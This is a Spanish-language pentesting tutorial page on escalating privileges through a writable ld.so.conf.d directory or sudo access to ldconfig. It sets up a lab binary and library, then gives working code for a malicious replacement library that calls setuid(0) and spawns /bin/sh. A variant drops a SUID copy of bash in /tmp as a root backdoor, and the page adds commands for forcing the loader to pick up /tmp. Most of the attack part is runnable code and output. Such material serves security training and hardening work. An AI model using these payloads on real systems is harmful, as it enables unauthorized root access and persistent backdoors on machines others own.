# Ejemplo de exploit de privesc de ld.so

{{#include ../../banners/hacktricks-training.md}}

## Preparar el entorno

En la siguiente sección puedes encontrar el código de los archivos que vamos a utilizar para preparar el entorno

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** esos archivos en tu máquina, en la misma carpeta
2. **Compila** la **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib` y actualiza la caché: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegios de root)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Comprueba el entorno

Comprueba que _libcustom.so_ se esté **cargando** desde _/usr/lib_ y que puedas **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos útiles de triage

Al atacar un objetivo real, verifica el **nombre exacto de la library** que necesita el binario y lo que el **loader está resolviendo** actualmente:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Un par de detalles útiles:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **no funciona** porque la redirección la realiza tu shell actual. Usa `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` en su lugar.
- Los binarios **SUID/privileged** ignoran `LD_LIBRARY_PATH`/`LD_PRELOAD` en
**secure-execution mode**, pero los directorios procedentes de `/etc/ld.so.conf` siguen formando parte de la configuración de confianza del loader, por lo que esta misconfiguration todavía puede afectar a programas privileged.<sup>[[1]](#references)</sup>
- En versiones más recientes de glibc, el dynamic loader también expone
`--list-diagnostics`, lo que resulta útil para depurar la resolución de la caché y la selección de subdirectorios `glibc-hwcaps` cuando un hijack no se comporta como se esperaba.<sup>[[1]](#references)</sup>

## Exploit

En este escenario vamos a suponer que **alguien ha creado una entrada vulnerable** dentro de un archivo en _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si esperas que **root** (u otra cuenta con privilegios) ejecute posteriormente el binario vulnerable, normalmente es mejor dejar un **artefacto propiedad de root** en lugar de generar un shell interactivo. Por ejemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Luego, después de que se produzca la ejecución privilegiada, puedes usar `/tmp/rootbash -p`.

Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, debemos esperar un **reboot** o a que el usuario root ejecute **`ldconfig`** (_en caso de que puedas ejecutar este binario como **sudo** o tenga el **suid bit**, podrás ejecutarlo tú mismo_).

Una vez que esto haya ocurrido, **vuelve a comprobar** desde dónde el ejecutable `sharedvuln` está cargando la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, lo está **cargando desde `/home/ubuntu/lib`** y, si cualquier usuario lo ejecuta, se ejecutará un shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Ten en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que root u otro usuario privilegiado ejecute el binario vulnerable**, podremos escalar privilegios.

### Otras configuraciones incorrectas - Misma vuln

En el ejemplo anterior simulamos una configuración incorrecta en la que un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración en `/etc/ld.so.conf.d/`**.\
Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad: si tienes **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puedes configurar la misma vulnerabilidad y explotarla.

## Exploit 2

**Supón que tienes privilegios sudo sobre `ldconfig`**.\
Puedes indicar a `ldconfig` **desde dónde cargar los archivos conf**, así que podemos aprovecharlo para hacer que `ldconfig` cargue carpetas arbitrarias.<sup>[[2]](#references)</sup>\
Por lo tanto, creemos los archivos y carpetas necesarios para cargar "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **previous exploit**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y comprobemos desde dónde está cargando la biblioteca el binary:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, tener privilegios de sudo sobre `ldconfig` permite explotar la misma vulnerabilidad.**

## Referencias

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
